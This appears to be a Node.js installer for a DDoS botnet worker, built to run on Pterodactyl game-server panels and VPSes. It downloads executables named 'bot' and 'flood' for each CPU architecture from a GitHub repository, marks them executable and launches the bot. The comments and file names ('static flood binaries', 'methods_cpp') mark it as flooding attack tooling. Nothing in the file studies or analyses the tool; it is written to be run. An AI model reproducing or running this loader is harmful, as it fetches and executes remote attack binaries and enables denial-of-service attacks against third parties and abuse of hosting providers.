/**
 * Bot v2 Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
 * Downloads fully-static flood binaries (musl, TLS-enabled) for ALL devices
 * plus the bot worker. No glibc/GLIBCXX dependency at runtime.
 */

const https = require('https');
const http  = require('http');
const os    = require('os');
const fs    = require('fs');
const path  = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';

// Map Node arch -> our static flood binary suffix
const ARCH_MAP = {
    x64:   'x86_64',
    arm64: 'aarch64',
    arm:   'armv7l',
    ia32:  'x86',
    ppc64: 'x86_64', // fallback
    s390x: 'x86_64', // fallback
};

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot`,       filename: 'bot',       executable: true  },
    { url: `${REPO_BASE}/agent.txt`,      filename: 'agent.txt', executable: false },
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP ${res.statusCode} — ${url}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);
            fileStream.on('finish', () => fileStream.close(resolve));
            fileStream.on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
        }).on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
    });
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Bot v2 in: ${targetDir}`);
    console.log(`[+] Platform: ${os.platform()} arch: ${os.arch()}`);

    const binArch   = ARCH_MAP[os.arch()] || 'x86_64';
    const localDir  = path.join(__dirname, '..');
    const targetFlood = path.join(targetDir, 'flood');

    // ---- arch-specific static bot ----
    const botItem = { url: `${REPO_BASE}/bots/bot-${binArch}`, filename: 'bot', executable: true };
    const localBot = path.join(localDir, 'bots', `bot-${binArch}`);
    if (fs.existsSync(localBot)) {
        fs.copyFileSync(localBot, path.join(targetDir, 'bot'));
        fs.chmodSync(path.join(targetDir, 'bot'), 0o755);
        console.log(`[*] Copied local static bot (${binArch})...`);
    } else {
        const destBot = path.join(targetDir, 'bot');
        if (!fs.existsSync(destBot)) {
            try {
                process.stdout.write(`[*] Downloading static bot (${binArch})... `);
                await download(`${botItem.url}?t=${Date.now()}`, destBot);
                fs.chmodSync(destBot, 0o755);
                console.log('OK');
            } catch (err) {
                console.log(`[!] Arch bot unavailable (${err.message}); will try generic bot later.`);
            }
        }
    }

    // ---- flood (fully static) ----
    const localStatic = path.join(localDir, 'methods_cpp', `flood-${binArch}`);
    const localPlain  = path.join(localDir, 'methods_cpp', 'flood');

    let floodOk = false;
    if (fs.existsSync(localStatic)) {
        console.log(`[*] Using local static flood (${binArch}) from methods_cpp...`);
        fs.copyFileSync(localStatic, targetFlood);
        fs.chmodSync(targetFlood, 0o755);
        floodOk = true;
    } else {
        // Try remote static flood
        try {
            process.stdout.write(`[*] Downloading static flood (${binArch})... `);
            await download(`${REPO_BASE}/methods_cpp/flood-${binArch}?t=${Date.now()}`, targetFlood);
            fs.chmodSync(targetFlood, 0o755);
            console.log('OK');
            floodOk = true;
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Static flood ${binArch} not available: ${err.message}`);
        }
    }

    if (!floodOk && fs.existsSync(localPlain)) {
        console.log('[*] Falling back to local (dynamic) flood binary...');
        fs.copyFileSync(localPlain, targetFlood);
        fs.chmodSync(targetFlood, 0o755);
        floodOk = true;
    } else if (!floodOk && !fs.existsSync(targetFlood)) {
        try {
            console.log('[*] Trying generic dynamic flood fallback...');
            await download(`${REPO_BASE}/bots/flood?t=${Date.now()}`, targetFlood);
            fs.chmodSync(targetFlood, 0o755);
        } catch (err) {
            console.error(`[!] All flood download attempts failed: ${err.message}`);
        }
    }

    // ---- bot (generic fallback) + agent.txt ----
    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        if (!fs.existsSync(dest)) {
            const localFile = path.join(localDir, item.filename === 'bot' ? 'bots/bot' : item.filename);
            if (fs.existsSync(localFile)) {
                fs.copyFileSync(localFile, dest);
                if (item.executable) fs.chmodSync(dest, 0o755);
                console.log(`[*] Copied local ${item.filename}`);
                continue;
            }

            try {
                process.stdout.write(`[*] Downloading ${item.filename}... `);
                await download(`${item.url}?t=${Date.now()}`, dest);
                console.log('OK');
                if (item.executable) {
                    fs.chmodSync(dest, 0o755);
                    console.log(`[+] chmod +x ${item.filename}`);
                }
            } catch (err) {
                console.log('FAILED');
                console.error(`[!] ${item.filename}: ${err.message}`);
            }
        }
    }

    const botBin = path.join(targetDir, 'bot');
    if (!fs.existsSync(botBin)) {
        console.error('[-] Bot binary not found, aborting.');
        process.exit(1);
    }
    if (!fs.existsSync(targetFlood)) {
        console.error('[-] flood binary not found, aborting.');
        process.exit(1);
    }

    console.log('[+] Launching Bot v2 worker...');
    const child = spawn(botBin, [], {
        cwd:   targetDir,
        stdio: ['inherit', 'pipe', 'pipe'],
    });

    child.stdout.on('data', (d) => process.stdout.write(d));
    child.stderr.on('data', (d) => process.stderr.write(d));
    child.on('error', (err) => { console.error(`[!] ${err.message}`); process.exit(1); });
    child.on('exit',  (code, sig) => {
        console.log(`[!] Bot v2 exited: code=${code} signal=${sig}`);
        process.exit(code || 0);
    });

    process.on('SIGINT',  () => child.kill('SIGINT'));
    process.on('SIGTERM', () => child.kill('SIGTERM'));
}

setup().catch((err) => {
    console.error(`[!] Bot v2 setup failed: ${err.message}`);
    process.exit(1);
});